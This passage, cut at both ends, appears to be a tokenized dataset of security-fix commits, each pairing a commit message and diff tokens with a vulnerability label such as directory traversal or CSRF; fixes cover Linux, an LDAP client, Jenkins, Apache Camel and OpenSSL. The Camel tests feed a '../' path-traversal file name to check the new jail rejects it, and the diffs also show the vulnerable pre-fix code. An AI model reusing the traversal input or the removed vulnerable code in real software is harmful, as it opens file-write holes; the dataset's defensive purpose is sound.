"CONFIG_KGDB_LOW_LEVEL_TRAP", "@", "@", "-", "609", ",", "15", "+", "615", ",", "10", "@", "@", "dotraplinkage", "void", "notrace", "do_int3", "(", "struct", "pt_regs", "*", "regs", ",", "long", "error_code", ")", "SIGTRAP", ")", "=", "=", "NOTIFY_STOP", ")", "goto", "exit", ";", "/", "*", "*", "Let", "others", "(", "NMI", ")", "know", "that", "the", "debug", "stack", "is", "in", "use", "*", "as", "we", "may", "switch", "to", "the", "interrupt", "stack", ".", "*", "/", "debug_stack_usage_inc", "(", ");", "cond_local_irq_enable", "(", "regs", ")", ";", "do_trap", "(", "X86_TRAP_BP", ",", "SIGTRAP", ",", "\"", "int3", "\"", ",", "regs", ",", "error_code", ",", "NULL", ")", ";", "cond_local_irq_disable", "(", "regs", ")", ";", "debug_stack_usage_dec", "(", ");", "exit", ":", "ist_exit", "(", "regs", ")", ";", "}"], "docstring_tokens": ["data", "breakpoints"]}
{"contents": ["Fixed", "some", "race", "condition", "in", "LdapConnection", "when", "using", "SSL"], "code_tokens": ["@", "@", "-", "165", ",", "8", "+", "165", ",", "10", "@", "@", "import", "org", ".", "apache", ".", "mina", ".", "core", ".", "future", ".", "WriteFuture", ";", "import", "org", ".", "apache", ".", "mina", ".", "core", ".", "service", ".", "IoConnector", ";", "import", "org", ".", "apache", ".", "mina", ".", "core", ".", "session", ".", "IoSession", ";", "import", "org", ".", "apache", ".", "mina", ".", "filter", ".", "FilterEvent", ";", "import", "org", ".", "apache", ".", "mina", ".", "filter", ".", "codec", ".", "ProtocolCodecFilter", ";", "import", "org", ".", "apache", ".", "mina", ".", "filter", ".", "codec", ".", "ProtocolEncoderException", ";", "import", "org", ".", "apache", ".", "mina", ".", "filter", ".", "ssl", ".", "SslEvent", ";", "import", "org", ".", "apache", ".", "mina", ".", "filter", ".", "ssl", ".", "SslFilter", ";", "import", "org", ".", "apache", ".", "mina", ".", "transport", ".", "socket", ".", "SocketSessionConfig", ";", "import", "org", ".", "apache", ".", "mina", ".", "transport", ".", "socket", ".", "nio", ".", "NioSocketConnector", ";", "@", "@", "-", "242", ",", "6", "+", "244", ",", "9", "@", "@", "/", "**", "The", "krb5", "configuration", "property", "*", "/", "private", "static", "final", "String", "KRB5_CONF", "=", "\"", "java", ".", "security", ".", "krb5", ".", "conf", "\"", ";", "/", "**", "A", "future", "used", "to", "block", "any", "action", "until", "the", "handhake", "is", "completed", "*", "/", "private", "HandshakeFuture", "handshakeFuture", ";", "/", "/", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "common", "error", "messages", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~", "static", "final", "String", "TIME_OUT_ERROR", "=", "\"", "TimeOut", "occurred", "\"", ";", "@", "@", "-", "668", ",", "6", "+", "673", ",", "26", "@", "@", "public", "boolean", "connect", "(", ")", "throws", "LdapException", "while", "(", "maxRetry", ">", "System", ".", "currentTimeMillis", "(", ")", "&", "&", "!", "interrupted", ")", "{", "connectionFuture", "=", "connector", ".", "connect", "(", "address", ")", ";", "if", "(", "config", ".", "isUseSsl", "(", ")", ")", "{", "try", "{", "boolean", "isSecured", "=", "handshakeFuture", ".", "get", "(", "timeout", ",", "TimeUnit", ".", "MILLISECONDS", ")", ";", "if", "(", "!", "isSecured", ")", "{", "throw", "new", "LdapOperationException", "(", "ResultCodeEnum", ".", "OTHER", ",", "I18n", ".", "err", "(", "I18n", ".", "ERR_4100_TLS_HANDSHAKE_ERROR", ")", ")", ";", "}", "}", "catch", "(", "Exception", "e", ")", "{", "String", "msg", "=", "\"", "Failed", "to", "initialize", "the", "SSL", "context", "\"", ";", "LOG", ".", "error", "(", "msg", ",", "e", ")", ";", "throw", "new", "LdapException", "(", "msg", ",", "e", ")", ";", "}", "}", "boolean", "result", "=", "false", ";", "@", "@", "-", "861", ",", "7", "+", "886", ",", "6", "@", "@", "else", "if", "(", "responseFuture", "instanceof", "SearchFuture", ")", "/", "/", "Get", "back", "the", "session", "ldapSession", "=", "connectionFuture", ".", "getSession", "(", ");", "connected", ".", "set", "(", "true", ")", ";", "/", "/", "Store", "the", "container", "into", "the", "session", "if", "we", "don", "'", "t", "have", "one", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "@", "@", "-", "2432", ",", "27", "+", "2456", ",", "6", "@", "@", "private", "boolean", "isNoticeOfDisconnect", "(", "Message", "message", ")", "public", "void", "messageReceived", "(", "IoSession", "session", ",", "Object", "message", ")", "throws", "Exception", "{", "/", "/", "Feed", "the", "response", "and", "store", "it", "into", "the", "session", "if", "(", "message", "instanceof", "SslFilter", ".", "SslFilterMessage", ")", "{", "/", "/", "This", "is", "a", "SSL", "message", "telling", "if", "the", "session", "has", "been", "secured", "or", "not", "HandshakeFuture", "handshakeFuture", "=", "(", "HandshakeFuture", ")", "ldapSession", ".", "getAttribute", "(", "\"", "HANDSHAKE_FUTURE", "\"", ")", ";", "if", "(", "message", "=", "=", "SslFilter", ".", "SESSION_SECURED", ")", "{", "/", "/", "SECURED", "handshakeFuture", ".", "secured", "(", ");", "}", "else", "{", "/", "/", "UNSECURED", "handshakeFuture", ".", "cancel", "(", ");", "}", "ldapSession", ".", "removeAttribute", "(", "\"", "HANDSHAKE_FUTURE", "\"", ")", ";", "return", ";", "}", "Message", "response", "=", "(", "Message", ")", "message", ";", "if", "(", "LOG", ".", "isDebugEnabled", "(", ")", ")", "@", "@", "-", "4529", ",", "6", "+", "4532", ",", "7", "@", "@", "public", "void", "sessionCreated", "(", "IoSession", "session", ")", "throws", "Exception", "codec", ",", "config", ".", "getBinaryAttributeDetector", "(", ")", ")", ";", "session", ".", "setAttribute", "(", "LdapDecoder", ".", "MESSAGE_CONTAINER_ATTR", ",", "ldapMessageContainer", ")", ";", "connected", ".", "set", "(", "true", ")", ";", "}", "@", "@", "-", "4680", ",", "20", "+", "4684", ",", "16", "@", "@", "private", "void", "addSslFilter", "(", ")", "throws", "LdapException", "{", "\"", "TLSv1", "\"", ",", "\"", "TLSv1", ".", "1", "\"", ",", "\"", "TLSv1", ".", "2", "\"", "}", ")", ";", "}", "/", "/", "for", "LDAPS", "/", "/", "for", "LDAPS", "/", "TLS", "handshakeFuture", "=", "new", "HandshakeFuture", "(", ");", "if", "(", "(", "ldapSession", "=", "=", "null", ")", "|", "|", "!", "connected", ".", "get", "(", ")", ")", "{", "connector", ".", "getFilterChain", "(", ").", "addFirst", "(", "SSL_FILTER_KEY", ",", "sslFilter", ")", ";", "}", "else", "/", "/", "for", "StartTLS", "{", "HandshakeFuture", "handshakeFuture", "=", "new", "HandshakeFuture", "(", ");", "ldapSession", ".", "setAttribute", "(", "SslFilter", ".", "USE_NOTIFICATION", ",", "Boolean", ".", "TRUE", ")", ";", "ldapSession", ".", "setAttribute", "(", "\"", "HANDSHAKE_FUTURE", "\"", ",", "handshakeFuture", ")", ";", "ldapSession", ".", "getFilterChain", "(", ").", "addFirst", "(", "SSL_FILTER_KEY", ",", "sslFilter", ")", ";", "boolean", "isSecured", "=", "handshakeFuture", ".", "get", "(", "timeout", ",", "TimeUnit", ".", "MILLISECONDS", ")", ";", "if", "(", "!", "isSecured", ")", "@", "@", "-", "4911", ",", "13", "+", "4911", ",", "6", "@", "@", "public", "BindFuture", "bindSasl", "(", "SaslRequest", "saslRequest", ")", "throws", "LdapException", "*", "/", "private", "void", "writeRequest", "(", "Request", "request", ")", "throws", "LdapException", "{", "/", "/", "If", "we", "are", "meant", "to", "be", "using", "a", "secure", "connection", "but", "the", "ssl", "filter", "isn", "'", "in", "the", "filter", "chain", "then", "/", "/", "throw", "immediately", "if", "(", "config", ".", "isUseSsl", "(", ")", "&", "&", "!", "ldapSession", ".", "getFilterChain", "(", ").", "contains", "(", "\"", "sslFilter", "\"", ")", ")", "{", "throw", "new", "InvalidConnectionException", "(", "\"", "Attempting", "to", "send", "over", "an", "insecure", "connection", "\"", ")", ";", "}", "/", "/", "Send", "the", "request", "to", "the", "server", "WriteFuture", "writeFuture", "=", "ldapSession", ".", "write", "(", "request", ")", ";", "@", "@", "-", "5090", ",", "4", "+", "5083", ",", "18", "@", "@", "public", "void", "setConnectionConfig", "(", "SocketSessionConfig", "connectionConfig", ")", "{", "this", ".", "connectionConfig", "=", "connectionConfig", ";", "}", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "public", "void", "event", "(", "IoSession", "session", ",", "FilterEvent", "event", ")", "throws", "Exception", "{", "/", "/", "Check", "if", "it", "'", "s", "a", "SSLevent", "if", "(", "(", "event", "instanceof", "SslEvent", ")", "&", "&", "(", "(", "SslEvent", ")", "event", "=", "=", "SslEvent", ".", "SECURED", ")", ")", "{", "handshakeFuture", ".", "secured", "(", ");", "}", "}", "}"], "docstring_tokens": ["password", "disclosure"]}
{"contents": ["[SECURITY-169]", "-", "Convert", "crumb", "issuer", "salt", "to", "the", "confidential", "key"], "code_tokens": ["@", "@", "-", "17", ",", "6", "+", "17", ",", "7", "@", "@", "import", "javax", ".", "servlet", ".", "ServletRequest", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", ";", "import", "jenkins", ".", "security", ".", "HexStringConfidentialKey", ";", "import", "net", ".", "sf", ".", "json", ".", "JSONObject", ";", "@", "@", "-", "117", ",", "9", "+", "118", ",", "10", "@", "@", "private", "String", "getClientIP", "(", "HttpServletRequest", "req", ")", "{", "@", "Extension", "public", "static", "final", "class", "DescriptorImpl", "extends", "CrumbIssuerDescriptor", "<", "DefaultCrumbIssuer", ">", "implements", "ModelObject", "{", "private", "final", "static", "HexStringConfidentialKey", "CRUMB_SALT", "=", "new", "HexStringConfidentialKey", "(", "Jenkins", ".", "class", ",", "\"", "crumbSalt", "\"", ",", "16", ")", ";", "public", "DescriptorImpl", "(", ")", "{", "/", "/", "salt", "just", "needs", "to", "be", "unique", ",", "and", "it", "doesn", "'", "t", "have", "to", "be", "a", "secret", "super", "(", "Jenkins", ".", "getInstance", "(", ").", "getLegacyInstanceId", "(", "),", "System", ".", "getProperty", "(", "\"", "hudson", ".", "security", ".", "csrf", ".", "requestfield", "\"", ",", "\"", ".", "crumb", "\"", "))", ";", "super", "(", "CRUMB_SALT", ".", "get", "(", "),", "System", ".", "getProperty", "(", "\"", "hudson", ".", "security", ".", "csrf", ".", "requestfield", "\"", ",", "\"", ".", "crumb", "\"", "))", ";", "load", "(", ");", "}"], "docstring_tokens": ["cross-site", "request", "forgery"]}
{"contents": ["CAMEL-13042:", "File", "producer", "should", "by", "default", "only", "allow", "to", "write", "file\u2026", "(#2700)", "*", "CAMEL-13042:", "File", "producer", "should", "by", "default", "only", "allow", "to", "write", "files", "in", "the", "starting", "directory", "(or", "subs).", "Added", "new", "option", "to", "turn", "this", "on|off.", "*", "CAMEL-13042:", "Regen", "docs", "*", "CAMEL-13042:", "Polished"], "code_tokens": ["@", "@", "-", "92", ",", "6", "+", "92", ",", "8", "@", "@", "protected", "boolean", "keepLastModified", ";", "@", "UriParam", "(", "label", "=", "\"", "producer", ",", "advanced", "\"", ")", "protected", "boolean", "allowNullBody", ";", "@", "UriParam", "(", "label", "=", "\"", "producer", "\"", ",", "defaultValue", "=", "\"", "true", "\"", ")", "protected", "boolean", "jailStartingDirectory", "=", "true", ";", "/", "/", "consumer", "options", "@", "@", "-", "1235", ",", "6", "+", "1237", ",", "19", "@", "@", "public", "void", "setAllowNullBody", "(", "boolean", "allowNullBody", ")", "{", "this", ".", "allowNullBody", "=", "allowNullBody", ";", "}", "public", "boolean", "isJailStartingDirectory", "(", ")", "{", "return", "jailStartingDirectory", ";", "}", "/", "**", "*", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "*", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "*", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "*", "/", "public", "void", "setJailStartingDirectory", "(", "boolean", "jailStartingDirectory", ")", "{", "this", ".", "jailStartingDirectory", "=", "jailStartingDirectory", ";", "}", "public", "ExceptionHandler", "getOnCompletionExceptionHandler", "(", ")", "{", "return", "onCompletionExceptionHandler", ";", "}", "@", "@", "-", "20", ",", "6", "+", "20", ",", "7", "@", "@", "import", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "Lock", ";", "import", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "ReentrantLock", ";", "import", "org", ".", "apache", ".", "camel", ".", "CamelExchangeException", ";", "import", "org", ".", "apache", ".", "camel", ".", "Exchange", ";", "import", "org", ".", "apache", ".", "camel", ".", "Expression", ";", "import", "org", ".", "apache", ".", "camel", ".", "impl", ".", "DefaultExchange", ";", "@", "@", "-", "331", ",", "7", "+", "332", ",", "7", "@", "@", "public", "String", "createFileName", "(", "Exchange", "exchange", ")", "{", "exchange", ".", "getIn", "(", ").", "setHeader", "(", "Exchange", ".", "FILE_NAME", ",", "value", ")", ";", "}", "if", "(", "value", "!", "=", "null", "&", "&", "value", "instanceof", "String", "&", "&", "StringHelper", ".", "hasStartToken", "(", "(", "String", ")", "value", ",", "\"", "simple", "\"", "))", "{", "if", "(", "value", "instanceof", "String", "&", "&", "StringHelper", ".", "hasStartToken", "(", "(", "String", ")", "value", ",", "\"", "simple", "\"", "))", "{", "log", ".", "warn", "(", "\"", "Simple", "expression", ":", "{", "}", "detected", "in", "header", ":", "{", "}", "of", "type", "String", ".", "This", "feature", "has", "been", "removed", "(", "see", "CAMEL", "-", "6748", ")", ".\"", ",", "value", ",", "Exchange", ".", "FILE_NAME", ")", ";", "}", "@", "@", "-", "378", ",", "6", "+", "379", ",", "15", "@", "@", "public", "String", "createFileName", "(", "Exchange", "exchange", ")", "{", "answer", "=", "baseDir", "+", "endpoint", ".", "getGeneratedFileName", "(", "exchange", ".", "getIn", "(", "))", ";", "}", "if", "(", "endpoint", ".", "isJailStartingDirectory", "(", "))", "{", "/", "/", "check", "for", "file", "must", "be", "within", "starting", "directory", "(", "need", "to", "compact", "first", "as", "the", "name", "can", "be", "using", "relative", "paths", "via", ".", "./", "etc", ")", "String", "compatchAnswer", "=", "FileUtil", ".", "compactPath", "(", "answer", ")", ";", "String", "compatchBaseDir", "=", "FileUtil", ".", "compactPath", "(", "baseDir", ")", ";", "if", "(", "!", "compatchAnswer", ".", "startsWith", "(", "compatchBaseDir", ")", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Cannot", "write", "file", "with", "name", ":", "\"", "+", "compatchAnswer", "+", "\"", "as", "the", "filename", "is", "jailed", "to", "the", "starting", "directory", ":", "\"", "+", "compatchBaseDir", ")", ";", "}", "}", "if", "(", "endpoint", ".", "getConfiguration", "(", ").", "needToNormalize", "(", "))", "{", "/", "/", "must", "normalize", "path", "to", "cater", "for", "Windows", "and", "other", "OS", "answer", "=", "normalizePath", "(", "answer", ")", ";", "@", "@", "-", "74", ",", "7", "+", "74", ",", "7", "@", "@", "public", "void", "testProducerDateByExpression", "(", ")", "throws", "Exception", "{", "public", "void", "testProducerComplexByExpression", "(", ")", "throws", "Exception", "{", "String", "expression", "=", "\"", "..", "/", "filelanguageinbox", "/", "myfile", "-", "${", "bean", ":", "myguidgenerator", ".", "guid", "}", "-$", "{", "date", ":", "now", ":", "yyyyMMdd", "}", ".", "txt", "\"", ";", "template", ".", "sendBody", "(", "\"", "file", ":", "//", "target", "/", "filelanguage", "?", "fileName", "=", "\"", "+", "expression", ",", "\"", "Hello", "World", "\"", ");", "template", ".", "sendBody", "(", "\"", "file", ":", "//", "target", "/", "filelanguage", "?", "jailStartingDirectory", "=", "false", "&", "fileName", "=", "\"", "+", "expression", ",", "\"", "Hello", "World", "\"", ");", "String", "date", "=", "new", "SimpleDateFormat", "(", "\"", "yyyyMMdd", "\"", ").", "format", "(", "new", "Date", "(", "))", ";", "assertFileExists", "(", "\"", "target", "/", "filelanguageinbox", "/", "myfile", "-", "123", "-", "\"", "+", "date", "+", "\"", ".", "txt", "\"", ");", "@", "@", "-", "0", ",", "0", "+", "1", ",", "73", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "file", ";", "import", "org", ".", "apache", ".", "camel", ".", "ContextTestSupport", ";", "import", "org", ".", "apache", ".", "camel", ".", "Exchange", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "FileProducerJailStartingDirectoryTest", "extends", "ContextTestSupport", "{", "@", "Override", "@", "Before", "public", "void", "setUp", "(", ")", "throws", "Exception", "{", "deleteDirectory", "(", "\"", "target", "/", "jail", "\"", ");", "super", ".", "setUp", "(", ");", "}", "@", "Test", "public", "void", "testWriteOutsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "0", ")", ";", "try", "{", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Hello", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "hello", ".", "txt", "\"", ");", "fail", "(", "\"", "Should", "have", "thrown", "exception", "\"", ");", "}", "catch", "(", "Exception", "e", ")", "{", "IllegalArgumentException", "iae", "=", "assertIsInstanceOf", "(", "IllegalArgumentException", ".", "class", ",", "e", ".", "getCause", "(", "))", ";", "assertTrue", "(", "iae", ".", "getMessage", "(", ").", "contains", "(", "\"", "as", "the", "filename", "is", "jailed", "to", "the", "starting", "directory", "\"", "))", ";", "}", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Test", "public", "void", "testWriteInsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "1", ")", ";", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Bye", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "outbox", "/", "bye", ".", "txt", "\"", ");", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "from", "(", "\"", "direct", ":", "start", "\"", ")", ".", "setHeader", "(", "Exchange", ".", "FILE_NAME", ",", "simple", "(", "\".", "./", "${", "file", ":", "name", "}", "\")", ")", ".", "to", "(", "\"", "file", ":", "target", "/", "jail", "/", "outbox", "\"", ")", ".", "to", "(", "\"", "mock", ":", "result", "\"", ");", "}", "}", ";", "}", "}", "@", "@", "-", "85", ",", "7", "+", "85", ",", "7", "@", "@", "public", "void", "testProducerDateByExpression", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testProducerComplexByExpression", "(", ")", "throws", "Exception", "{", "/", "/", "need", "one", "extra", "subdirectory", "(", "=", "foo", ")", "to", "be", "able", "to", "start", "with", ".", ".", "in", "the", "fileName", "option", "String", "url", "=", "\"", "ftp", ":", "//", "admin", "@", "localhost", ":", "\"", "+", "getPort", "(", ")", "+", "\"", "/", "filelanguage", "/", "foo", "?", "password", "=", "admin", "\"", ";", "String", "url", "=", "\"", "ftp", ":", "//", "admin", "@", "localhost", ":", "\"", "+", "getPort", "(", ")", "+", "\"", "/", "filelanguage", "/", "foo", "?", "password", "=", "admin", "&", "jailStartingDirectory", "=", "false", "\"", ";", "String", "expression", "=", "\"", "..", "/", "filelanguageinbox", "/", "myfile", "-", "${", "bean", ":", "myguidgenerator", ".", "guid", "}", "-$", "{", "date", ":", "now", ":", "yyyyMMdd", "}", ".", "txt", "\"", ";", "template", ".", "sendBody", "(", "url", "+", "\"", "&", "fileName", "=", "\"", "+", "expression", ",", "\"", "Hello", "World", "\"", ");", "@", "@", "-", "0", ",", "0", "+", "1", ",", "68", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "file", ".", "remote", ";", "import", "org", ".", "apache", ".", "camel", ".", "Exchange", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "FtpProducerJailStartingDirectoryTest", "extends", "FtpServerTestSupport", "{", "private", "String", "getFtpUrl", "(", ")", "{", "return", "\"", "ftp", ":", "//", "admin", "@", "localhost", ":", "\"", "+", "getPort", "(", ")", "+", "\"", "/", "upload", "/", "jail", "?", "binary", "=", "false", "&", "password", "=", "admin", "&", "tempPrefix", "=", ".", "uploading", "\"", ";", "}", "@", "Test", "public", "void", "testWriteOutsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "0", ")", ";", "try", "{", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Hello", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "hello", ".", "txt", "\"", ");", "fail", "(", "\"", "Should", "have", "thrown", "exception", "\"", ");", "}", "catch", "(", "Exception", "e", ")", "{", "IllegalArgumentException", "iae", "=", "assertIsInstanceOf", "(", "IllegalArgumentException", ".", "class", ",", "e", ".", "getCause", "(", "))", ";", "assertTrue", "(", "iae", ".", "getMessage", "(", ").", "contains", "(", "\"", "as", "the", "filename", "is", "jailed", "to", "the", "starting", "directory", "\"", "))", ";", "}", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Test", "public", "void", "testWriteInsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "1", ")", ";", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Bye", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "jail", "/", "bye", ".", "txt", "\"", ");", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "from", "(", "\"", "direct", ":", "start", "\"", ")", ".", "setHeader", "(", "Exchange", ".", "FILE_NAME", ",", "simple", "(", "\".", "./", "${", "file", ":", "name", "}", "\")", ")", ".", "to", "(", "getFtpUrl", "(", "))", ".", "to", "(", "\"", "mock", ":", "result", "\"", ");", "}", "}", ";", "}", "}", "\\", "No", "newline", "at", "end", "of", "file"], "docstring_tokens": ["directory", "traversal"]}
{"contents": ["Don't", "allow", "too", "many", "consecutive", "warning", "alerts", "Certain", "warning", "alerts", "are", "ignored", "if", "they", "are", "received.", "This", "can", "mean", "that", "no", "progress", "will", "be", "made", "if", "one", "peer", "continually", "sends", "those", "warning", "alerts.", "Implement", "a", "count", "so", "that", "we", "abort", "the", "connection", "if", "we", "receive", "too", "many.", "Issue", "reported", "by", "Shi", "Lei.", "Reviewed-by:", "Rich", "Salz", "<rsalz@openssl.org>"], "code_tokens": ["@", "@", "-", "2485", ",", "6", "+", "2485", ",", "7", "@", "@", "int", "ERR_load_SSL_strings", "(", "void", ")", ";", "#", "define", "SSL_R_TLS_HEARTBEAT_PENDING", "366", "#", "define", "SSL_R_TLS_ILLEGAL_EXPORTER_LABEL", "367", "#", "define", "SSL_R_TLS_INVALID_ECPOINTFORMAT_LIST", "157", "#", "define", "SSL_R_TOO_MANY_WARN_ALERTS", "409", "#", "define", "SSL_R_UNABLE_TO_FIND_ECDH_PARAMETERS", "314", "#", "define", "SSL_R_UNABLE_TO_FIND_PUBLIC_KEY_PARAMETERS", "239", "#", "define", "SSL_R_UNABLE_TO_LOAD_SSL3_MD5_ROUTINES", "242", "@", "@", "-", "443", ",", "6", "+", "443", ",", "14", "@", "@", "int", "dtls1_read_bytes", "(", "SSL", "*", "s", ",", "int", "type", ",", "int", "*", "recvd_type", ",", "unsigned", "char", "*", "buf", ",", "}", "}", "/", "*", "*", "Reset", "the", "count", "of", "consecutive", "warning", "alerts", "if", "we", "'", "ve", "got", "a", "non", "-", "empty", "*", "record", "that", "isn", "'", "t", "an", "alert", ".", "*", "/", "if", "(", "SSL3_RECORD_get_type", "(", "rr", ")", "!", "=", "SSL3_RT_ALERT", "&", "&", "SSL3_RECORD_get_length", "(", "rr", ")", "!", "=", "0", ")", "s", "-", ">", "rlayer", ".", "alert_count", "=", "0", ";", "/", "*", "we", "now", "have", "a", "packet", "which", "can", "be", "read", "and", "processed", "*", "/", "if", "(", "s", "-", ">", "s3", "-", ">", "change_cipher_spec", "/", "*", "set", "when", "we", "receive", "ChangeCipherSpec", ",", "@", "@", "-", "722", ",", "6", "+", "730", ",", "14", "@", "@", "int", "dtls1_read_bytes", "(", "SSL", "*", "s", ",", "int", "type", ",", "int", "*", "recvd_type", ",", "unsigned", "char", "*", "buf", ",", "if", "(", "alert_level", "=", "=", "SSL3_AL_WARNING", ")", "{", "s", "-", ">", "s3", "-", ">", "warn_alert", "=", "alert_descr", ";", "s", "-", ">", "rlayer", ".", "alert_count", "+", "+;", "if", "(", "s", "-", ">", "rlayer", ".", "alert_count", "=", "=", "MAX_WARN_ALERT_COUNT", ")", "{", "al", "=", "SSL_AD_UNEXPECTED_MESSAGE", ";", "SSLerr", "(", "SSL_F_DTLS1_READ_BYTES", ",", "SSL_R_TOO_MANY_WARN_ALERTS", ")", ";", "goto", "f_err", ";", "}", "if", "(", "alert_descr", "=", "=", "SSL_AD_CLOSE_NOTIFY", ")", "{", "#", "ifndef", "OPENSSL_NO_SCTP", "/", "*", "@", "@", "-", "1063", ",", "6", "+", "1063", ",", "14", "@", "@", "int", "ssl3_read_bytes", "(", "SSL", "*", "s", ",", "int", "type", ",", "int", "*", "recvd_type", ",", "unsigned", "char", "*", "buf", ",", "}", "while", "(", "num_recs", "=", "=", "0", ")", ";", "rr", "=", "&", "rr", "[", "curr_rec", "]", ";", "/", "*", "*", "Reset", "the", "count", "of", "consecutive", "warning", "alerts", "if", "we", "'", "ve", "got", "a", "non", "-", "empty", "*", "record", "that", "isn", "'", "t", "an", "alert", ".", "*", "/", "if", "(", "SSL3_RECORD_get_type", "(", "rr", ")", "!", "=", "SSL3_RT_ALERT", "&", "&", "SSL3_RECORD_get_length", "(", "rr", ")", "!", "=", "0", ")", "s", "-", ">", "rlayer", ".", "alert_count", "=", "0", ";", "/", "*", "we", "now", "have", "a", "packet", "which", "can", "be", "read", "and", "processed", "*", "/", "if", "(", "s", "-", ">", "s3", "-", ">", "change_cipher_spec", "/", "*", "set", "when", "we", "receive", "ChangeCipherSpec", ",", "@", "@", "-", "1333", ",", "6", "+", "1341", ",", "14", "@", "@", "int", "ssl3_read_bytes", "(", "SSL", "*", "s", ",", 